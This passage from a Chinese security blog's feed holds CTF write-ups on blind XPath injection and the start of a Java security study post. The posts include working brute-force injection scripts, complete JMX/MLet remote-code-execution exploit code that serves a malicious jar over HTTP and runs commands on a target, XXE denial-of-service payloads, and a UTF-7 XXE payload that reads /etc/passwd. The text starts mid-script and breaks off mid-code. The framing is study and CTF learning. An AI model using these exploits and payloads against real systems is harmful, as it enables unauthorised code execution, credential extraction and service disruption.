=&#x27;http://1faab4d0-7d84-46a1-b6fb-5dc991bc7f72.node4.buuoj.cn:81/index.php&#x27;</span><span class="language-xml"></span><span class="language-xml"></span><span class="language-xml">strs =&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><span class="language-xml"></span><span class="language-xml"></span><span class="language-xml">flag =&#x27;&#x27;</span><span class="language-xml">for i in range(1,100):</span><span class="language-xml">    for j in strs:</span><span class="language-xml"></span><span class="language-xml">        #猜测根节点名称</span><span class="language-xml">        # payload_1 = </span><span class="hljs-template-variable">&#123;&quot;username&quot;:&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;</span><span class="language-xml">, 1)=&#x27;</span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">&#x27;  or &#x27;&#x27;=&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>3123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>&quot;.format(i,j),&quot;password&quot;:123&#125;</span><span class="language-xml">        #猜测子节点名称</span><span class="language-xml">        # payload_2 = &quot;<span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>&#x27;or substring(name(/root/*[1]), </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">, 1)=&#x27;</span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">&#x27;  or &#x27;&#x27;=&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>3123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">token</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">token</span>&gt;</span>&quot;.format(i,j,token[0])</span><span class="language-xml"></span><span class="language-xml">        #猜测accounts的节点</span><span class="language-xml">        # payload_3 =&quot;<span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>&#x27;or substring(name(/root/accounts/*[1]), </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">, 1)=&#x27;</span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">&#x27;  or &#x27;&#x27;=&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>3123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">token</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">token</span>&gt;</span>&quot;.format(i,j,token[0])</span><span class="language-xml"></span><span class="language-xml">        #猜测user节点</span><span class="language-xml">        # payload_4 =&quot;<span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>&#x27;or substring(name(/root/accounts/user/*[2]), </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">, 1)=&#x27;</span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">&#x27;  or &#x27;&#x27;=&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>3123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">token</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">token</span>&gt;</span>&quot;.format(i,j,token[0])</span><span class="language-xml"></span><span class="language-xml">        #跑用户名和密码</span><span class="language-xml">        # payload_username =&quot;<span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>&#x27;or substring(/accounts/user[1]/username/text(), </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">, 1)=&#x27;</span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)</span><span class="language-xml">        payload_username =&quot;<span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>&#x27;or substring(/accounts/user[1]/password/text(), </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">, 1)=&#x27;</span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)</span><span class="language-xml">        data=</span><span class="hljs-template-variable">&#123;</span><span class="hljs-template-variable">            &quot;username&quot;:payload_username,</span><span class="hljs-template-variable">            &quot;password&quot;:123,</span><span class="hljs-template-variable">            &quot;submit&quot;:&quot;1&quot;</span><span class="hljs-template-variable">        &#125;</span><span class="language-xml"></span><span class="language-xml">        #</span><span class="language-xml">        # payload_password =&quot;<span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>&#x27;or substring(/root/accounts/user[2]/password/text(), </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">, 1)=&#x27;</span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">&#x27;  or &#x27;&#x27;=&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>3123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">token</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">token</span>&gt;</span>&quot;.format(i,j,token[0])</span><span class="language-xml"></span><span class="language-xml"></span><span class="language-xml">        print(payload_username)</span><span class="language-xml">        r = requests.post(url=url,data=data)</span><span class="language-xml">        time.sleep(0.1)</span><span class="language-xml">        # print(r.text)</span><span class="language-xml">#003d7628772d6b57fec5f30ccbc82be1</span><span class="language-xml"></span><span class="language-xml">        if &quot;登录成功&quot; in r.text:</span><span class="language-xml">            flag+=j</span><span class="language-xml">            print(flag)</span><span class="language-xml">            break</span><span class="language-xml"></span><span class="language-xml">    if &quot;登录失败&quot; in r.text:</span><span class="language-xml">        break</span><span class="language-xml"></span><span class="language-xml">print(flag)</span></code></pre></div><h1 id="CodegateCTF2022"><a href="#CodegateCTF2022" class="headerlink" title="CodegateCTF2022"></a>CodegateCTF2022</h1><p>读系统配置</p><div class="code-wrapper"><pre><code class="hljs sqf"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and starts-with(system-property(&#x27;</span><span class="hljs-built_in">flag</span><span class="hljs-string">&#x27;), +flag+x ) and&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> ascii_lowercase, digits<span class="hljs-keyword">SESSION</span> = &#123;<span class="hljs-string">&#x27;JSESSIONID&#x27;</span>:<span class="hljs-string">&#x27;5D31583806832F60CE7133EEEA94EA6E&#x27;</span>&#125;flag = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">34</span>+len(<span class="hljs-string">&#x27;codegate2022&#x27;</span>)):    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ascii_lowercase+digits+<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>:        conn = requests.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;http://url/blog/read?idx=1%27%20and%20starts-with(system-property(%27flag%27),%27&#x27;</span>+flag+x+<span class="hljs-string">&#x27;%27)%20and%271%27=%271&#x27;</span>, cookies=<span class="hljs-keyword">SESSION</span>)        r1 = conn.text        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">in</span> r1:            flag += x            print(flag)            break</code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>跟着Y4tacker学java</title>
    <link href="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/"/>
    <url>/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/</url>
    
    <content type="html"><![CDATA[<h1 id="（持续跟新）"><a href="#（持续跟新）" class="headerlink" title="（持续跟新）"></a>（持续跟新）</h1><p><a href="https://github.com/Y4tacker/JavaSec/tree/main">Y4tacker&#x2F;JavaSec: a rep for documenting my study, may be from 0 to 0.1 (github.com)</a></p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="JMX"><a href="#JMX" class="headerlink" title="JMX"></a>JMX</h2><p>java管理扩展，用来管理和检测java程序，最常用到的就是对于JVM的监测和管理，比如JVM内存、CPU使用率、线程数、垃圾收集情况等等，最主要还是被用来做各种监控工具</p><p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918105421592.png" alt="image-20230918105421592"></p><p>MBeanServer负责管理MBean，所有的MBean都要注册到MBeanServer上</p><p>通过<code>ManagementFactory.getPlatformMBeanServer()</code>获取当前<code>JVM</code>内的<code>MBeanServer</code></p><h3 id="JMX-RMI攻击"><a href="#JMX-RMI攻击" class="headerlink" title="JMX RMI攻击"></a>JMX RMI攻击</h3><p>攻击者可以远程注入一个恶意的MBean，再去调用里面的用于执行命令的方法</p><p>前提条件:</p><ul><li>允许远程访问，没有开启认证 (com.sun.management.jmxremote.authenticate&#x3D;false)</li><li>能够远程注册 MBean (javax.management.loading.MLet)</li></ul><p>EvilMBean.java:</p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-comment">/**</span><span class="hljs-comment"> * 定义MBean接口和用来执行命令的方法</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">EvilMBean</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> runCommand(<span class="hljs-keyword">String</span> cmd);&#125;</code></pre></div><p>Evil.java:      (接口类名去掉MBean后缀)</p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> java.io.BufferedReader;<span class="hljs-keyword">import</span> java.io.InputStreamReader;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 类名要与实现的接口的前缀一样</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> <span class="hljs-keyword"><span class="hljs-keyword">implements</span> <span class="hljs-type">EvilMBean</span></span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> runCommand(<span class="hljs-keyword">String</span> cmd) &#123;        <span class="hljs-keyword">try</span> &#123;            Runtime rt = Runtime.getRuntime();            Process proc = rt.exec(cmd);            BufferedReader stdInput = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(proc.getInputStream()));            BufferedReader stdError = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(proc.getErrorStream()));            <span class="hljs-keyword">String</span> stdout_err_data = <span class="hljs-string">&quot;&quot;</span>;            <span class="hljs-keyword">String</span> s;            <span class="hljs-keyword">while</span> ((s = stdInput.readLine()) != <span class="hljs-literal">null</span>) &#123;                stdout_err_data += s + <span class="hljs-string">&quot;\n&quot;</span>;            &#125;            <span class="hljs-keyword">while</span> ((s = stdError.readLine()) != <span class="hljs-literal">null</span>) &#123;                stdout_err_data += s + <span class="hljs-string">&quot;\n&quot;</span>;            &#125;            proc.waitFor();            <span class="hljs-keyword">return</span> stdout_err_data;        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            <span class="hljs-keyword">return</span> e.toString();        &#125;    &#125;&#125;</code></pre></div><p>将上述两个java文件编译后打包成jar包:</p><div class="code-wrapper"><pre><code class="hljs reasonml">jar -cvf compromise.jar <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EvilMBean</span>.</span></span><span class="hljs-keyword">class</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Evil</span>.</span></span><span class="hljs-keyword">class</span></code></pre></div><p>注意打包的java版本，这会有版本问题，1.8.131 打包的在 1.7.80 用不了。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpExchange;<span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpHandler;<span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpServer;<span class="hljs-keyword">import</span> javax.management.MBeanServerConnection;<span class="hljs-keyword">import</span> javax.management.ObjectInstance;<span class="hljs-keyword">import</span> javax.management.ObjectName;<span class="hljs-keyword">import</span> javax.management.remote.JMXConnector;<span class="hljs-keyword">import</span> javax.management.remote.JMXConnectorFactory;<span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.net.InetAddress;<span class="hljs-keyword">import</span> java.net.InetSocketAddress;<span class="hljs-keyword">import</span> java.util.HashSet;<span class="hljs-keyword">import</span> java.util.Iterator;<span class="hljs-comment">/**</span><span class="hljs-comment"> * Created by k1n9 on 2017/8/23.</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteMbean</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">JARNAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;compromise.jar&quot;</span>;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">OBJECTNAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;MLetCompromise:name=evil,id=1&quot;</span>;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">EVILCLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Evil&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-keyword">try</span> &#123;        <span class="hljs-comment">//开启Http服务，提供带mlet标签的html和恶意MBean的jar包</span>            <span class="hljs-type">HttpServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> HttpServer.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(<span class="hljs-number">4141</span>), <span class="hljs-number">0</span>);            server.createContext(<span class="hljs-string">&quot;/mlet&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MLetHandler</span>());            server.createContext(<span class="hljs-string">&quot;/&quot;</span> + JARNAME, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JarHandler</span>());            server.setExecutor(<span class="hljs-literal">null</span>);            server.start();<span class="hljs-comment">//这里可以改成args的参数就可以在命令行下使用了，JMX的ip，端口，要执行的命令</span>            connectAndOwn(<span class="hljs-string">&quot;10.18.224.59&quot;</span>, <span class="hljs-string">&quot;2333&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>);            server.stop(<span class="hljs-number">0</span>);        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connectAndOwn</span><span class="hljs-params">(String serverName, String port, String command)</span> &#123;        <span class="hljs-keyword">try</span> &#123;        <span class="hljs-comment">//建立连接</span>            <span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://&quot;</span> + serverName + <span class="hljs-string">&quot;:&quot;</span> + port + <span class="hljs-string">&quot;/jmxrmi&quot;</span>);            System.out.println(<span class="hljs-string">&quot;URL: &quot;</span> + u + <span class="hljs-string">&quot;, connecting&quot;</span>);            <span class="hljs-type">JMXConnector</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> JMXConnectorFactory.connect(u, <span class="hljs-literal">null</span>);            System.out.println(<span class="hljs-string">&quot;Connected: &quot;</span> + c.getConnectionId());            <span class="hljs-type">MBeanServerConnection</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getMBeanServerConnection();            <span class="hljs-type">ObjectInstance</span> <span class="hljs-variable">evil_bean</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;            <span class="hljs-keyword">try</span> &#123;                evil_bean = m.getObjectInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectName</span>(OBJECTNAME));            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;                evil_bean = <span class="hljs-literal">null</span>;            &#125;            <span class="hljs-keyword">if</span> (evil_bean == <span class="hljs-literal">null</span>) &#123;                System.out.println(<span class="hljs-string">&quot;Trying to create bean...&quot;</span>);                <span class="hljs-type">ObjectInstance</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;                <span class="hljs-keyword">try</span> &#123;                    evil = m.createMBean(<span class="hljs-string">&quot;javax.management.loading.MLet&quot;</span>, <span class="hljs-literal">null</span>);                &#125; <span class="hljs-keyword">catch</span> (javax.management.InstanceAlreadyExistsException e) &#123;                    evil = m.getObjectInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectName</span>(<span class="hljs-string">&quot;DefaultDomain:type=MLet&quot;</span>));                &#125;                System.out.println(<span class="hljs-string">&quot;Loaded &quot;</span> + evil.getClassName());<span class="hljs-comment">//调用 getMBeansFromURL 从远程服务器获取 MBean</span>                <span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> m.invoke(evil.getObjectName(), <span class="hljs-string">&quot;getMBeansFromURL&quot;</span>,                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;String.format(<span class="hljs-string">&quot;http://%s:4141/mlet&quot;</span>, InetAddress.getLocalHost().getHostAddress())&#125;,                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;String.class.getName()&#125;                        );                <span class="hljs-type">HashSet</span> <span class="hljs-variable">res_set</span> <span class="hljs-operator">=</span> (HashSet)res;                <span class="hljs-type">Iterator</span> <span class="hljs-variable">itr</span> <span class="hljs-operator">=</span> res_set.iterator();                <span class="hljs-type">Object</span> <span class="hljs-variable">nextObject</span> <span class="hljs-operator">=</span> itr.next();                <span class="hljs-keyword">if</span> (nextObject <span class="hljs-keyword">instanceof</span> Exception) &#123;                    <span class="hljs-keyword">throw</span> ((Exception)nextObject);                &#125;                evil_bean = ((ObjectInstance)nextObject);            &#125;<span class="hljs-comment">//调用恶意 MBean 中用于执行命令的函数</span>            System.out.println(<span class="hljs-string">&quot;Loaded class: &quot;</span> + evil_bean.getClassName() + <span class="hljs-string">&quot; object &quot;</span> + evil_bean.getObjectName());            System.out.println(<span class="hljs-string">&quot;Calling runCommand with: &quot;</span> + command);            <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> m.invoke(evil_bean.getObjectName(), <span class="hljs-string">&quot;runCommand&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;command&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;String.class.getName()&#125;);            System.out.println(<span class="hljs-string">&quot;Result: &quot;</span> + result);        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MLetHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpHandler</span> &#123;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange t)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-comment">/**</span><span class="hljs-comment">             * mlet 标签</span><span class="hljs-comment">             * &lt;MLET</span><span class="hljs-comment"> * CODE = class | OBJECT = serfile</span><span class="hljs-comment"> * ARCHIVE = &quot;archiveList&quot;</span><span class="hljs-comment"> * [CODEBASE = codebaseURL]</span><span class="hljs-comment"> * [NAME = mbeanname]</span><span class="hljs-comment"> * [VERSION = version]</span><span class="hljs-comment"> * &gt;</span><span class="hljs-comment"> * [arglist]</span><span class="hljs-comment"> * &lt;/MLET&gt;</span><span class="hljs-comment">             */</span>            <span class="hljs-type">String</span> <span class="hljs-variable">respone</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;&lt;HTML&gt;&lt;mlet code=%s archive=%s name=%s&gt;&lt;/mlet&gt;&lt;/HTML&gt;&quot;</span>, EVILCLASS, JARNAME, OBJECTNAME);            System.out.println(<span class="hljs-string">&quot;Sending mlet: &quot;</span> + respone + <span class="hljs-string">&quot;\n&quot;</span>);            t.sendResponseHeaders(<span class="hljs-number">200</span>, respone.length());            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> t.getResponseBody();            os.write(respone.getBytes());            os.close();        &#125;    &#125;    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JarHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpHandler</span> &#123;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange t)</span> <span class="hljs-keyword">throws</span> IOException &#123;            System.out.println(<span class="hljs-string">&quot;Request made for JAR...&quot;</span>);            <span class="hljs-comment">//这里的 compromise.jar 可以根据实际的路径来修改</span>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/k1n9/Workspace/Java/compromise.jar&quot;</span>);            <span class="hljs-type">byte</span>[] bytearray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>)file.length()];            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);            <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fis);            bis.read(bytearray, <span class="hljs-number">0</span> , bytearray.length);            t.sendResponseHeaders(<span class="hljs-number">200</span>, file.length());            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> t.getResponseBody();            os.write(bytearray, <span class="hljs-number">0</span>, bytearray.length);            os.close();        &#125;    &#125;&#125;</code></pre></div><p>就带过吧，不知道有什么用</p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。</p><p>JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。</p><p>java Naming</p><p>java Directory</p><p>ObjectFactory</p><p>JNDI注入的问题就是出在可远程下载自定义的ObjectFactory类</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。</p><p>几个比较关键的属性：</p><ul><li>className：远程加载时所使用的类名；</li><li>classFactory：加载的class中需要实例化类的名称；</li><li>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file&#x2F;ftp&#x2F;http等协议；</li></ul><h2 id="类字节码"><a href="#类字节码" class="headerlink" title="类字节码"></a>类字节码</h2><p>利用javassist生成字节码 （都是代码，就不放上来了）</p><h2 id="java中的XXE"><a href="#java中的XXE" class="headerlink" title="java中的XXE"></a>java中的XXE</h2><p>内部实体与外部实体</p><p>这个概念还算比较重要故此特地记录一下</p><p>内部实体：如果一个实体是在DTD中声明的，它就被称为内部实体。 例如：<code>&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;</code></p><p>外部实体：如果一个实体在DTD之外被声明，那么它就被称为外部实体，由<strong>SYSTEM标识</strong>。 例如：<code>&lt;!ENTITY entity_name SYSTEM &quot;entity_value&quot;&gt;</code></p><h3 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h3><p>构造恶意XML文件耗尽可用内存</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps/dos.dtd&quot;</span> [</span><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">data</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><span class="hljs-meta">]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;tea;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % a0 <span class="hljs-string">&quot;dos&quot;</span> &gt;</span><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">a1</span> <span class="hljs-string">&quot;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;&quot;</span>&gt;</span><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">a2</span> <span class="hljs-string">&quot;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;&quot;</span>&gt;</span><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">a3</span> <span class="hljs-string">&quot;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;&quot;</span>&gt;</span><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">a4</span> <span class="hljs-string">&quot;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;&quot;</span>&gt;</span><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">tea</span> <span class="hljs-string">&quot;%a4;&quot;</span> &gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> [</span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY a <span class="hljs-string">&quot;a&amp;b;&quot;</span> &gt;</span></span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-string">&quot;&amp;a;&quot;</span> &gt;</span></span><span class="hljs-meta">]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;a;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span></code></pre></div><h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><p>可能支持的协议有<code>http/https/ftp/file/jar/netdoc/mailto/gopher</code>等但是不同版本支持的协议不一致，具体可以在具体java版本下的<code>sun.net.www.protocol</code>包下看到，这里不多讲了</p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>比如使用utf7</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-7&quot;</span> ?&gt;</span>+ADwAIQ-DOCTYPE ANY +AFs-  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-+AF0APg-+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-</code></pre></div><p>可能造成XXE的组件及修复</p><div class="code-wrapper"><pre><code class="hljs pgsql">javax.xml.parsers.DocumentBuilderFactory;javax.xml.parsers.SAXParserjavax.xml.<span class="hljs-keyword">transform</span>.TransformerFactoryjavax.xml.validation.<span class="hljs-keyword">Validator</span>javax.xml.validation.SchemaFactoryjavax.xml.<span class="hljs-keyword">transform</span>.sax.SAXTransformerFactoryjavax.xml.<span class="hljs-keyword">transform</span>.sax.SAXSourceorg.xml.sax.XMLReaderDocumentHelper.parseTextDocumentBuilderorg.xml.sax.helpers.XMLReaderFactoryorg.dom4j.io.SAXReaderorg.jdom.<span class="hljs-keyword">input</span>.SAXBuilderorg.jdom2.<span class="hljs-keyword">input</span>.SAXBuilderjavax.xml.bind.Unmarshallerjavax.xml.xpath.XpathExpressionjavax.xml.stream.XMLStreamReaderorg.apache.commons.digester3.Digesterrg.xml.sax.SAXParseExceptionpublicId</code></pre></div><div class="code-wrapper"><pre><code class="hljs awk">先实例化组件<span class="hljs-regexp">//</span>DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();<span class="hljs-regexp">//</span>SAXBuilder sb = new SAXBuilder();<span class="hljs-regexp">//</span>禁用DTDs (doctypes),几乎可以防御所有xml实体攻击dbf.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, true); <span class="hljs-regexp">//</span>首选<span 